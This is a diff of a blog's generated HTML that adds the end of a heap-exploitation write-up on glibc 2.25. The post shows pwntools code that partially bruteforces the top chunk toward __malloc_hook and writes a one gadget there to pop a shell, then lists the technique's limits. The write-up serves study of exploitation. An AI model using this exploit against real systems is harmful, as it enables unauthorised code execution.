+<p>Up to this point, we gained control of the top chunk without any leaks and without any bruteforcing, purely playing by the rules of malloc. AND we still have an opportunity of an unsortedbin attack! :)</p>
+<p>The remaining steps are pretty simple:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># partial bruteforce libc address of top chunk to point to malloc hook - 0x18, 1/16 probability</span></span><br><span class="line">edit(main_arena_chunk, p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0xe0</span>) + p8(<span class="number">0x4a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate two chunks and free one to get libc pointers, then partial overwrite to one gadget</span></span><br><span class="line">overwrite = malloc(<span class="number">0x98</span>)</span><br><span class="line">malloc(<span class="number">0x98</span>) <span class="comment"># prevent next size check into main arena and failing</span></span><br><span class="line">free(overwrite)</span><br><span class="line"></span><br><span class="line"><span class="comment"># partial bruteforce to one gadget, 1/4096 probability</span></span><br><span class="line">edit(overwrite, p8(<span class="number">0xb2</span>) + p8(<span class="number">0xcf</span>) + p8(<span class="number">0xa7</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># call malloc. our size field is, luckily, the argv pointer so pass in 0</span></span><br><span class="line">malloc(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>We partially bruteforce the top chunk to point to slightly before malloc hook, get libc pointers and bruteforce to one gadget.</p>
+<p>If the unsortedbin hadn’t been fixed, we won’t be able to allocate the 0x98 chunks to leak libc pointers, because malloc will attempt to search the unsorted bin and segfault somewhere.</p>
+<p>With a 1/4096 probability, we can get a shell.</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>When I first found out about this behaviour I genuinely got a shock xD, like woah malloc is made to be hacked!</p>
+<p>The whole post was about the Pros, so I’ll go over some Cons here.</p>
+<ul>
+<li>one gadget constraints still have to be satisfied, we cannot target free hook because the top chunk size cannot be 0</li>
+<li>bruteforcing is quite ugly tbh</li>
+<li>who still uses glibc 2.25?? more modern versions have top chunk checks, safe linking and even removed the hooks</li>
+<li>probably must have a UAF to work… which is a very very powerful primitive already</li>
+</ul>
+<p>At the very least, treat it as a variant of the House of Roman that might satisfy one gadget constraints that House of Roman doesn’t.</p>
+<p>Thanks for reading, take care and goodbye~</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">prototype pollution</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">HTB</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/11/27/house-of-pie/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2021/10/12/cmd5-promotion/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Best Hash Cracking Website</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -226,9 +376,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
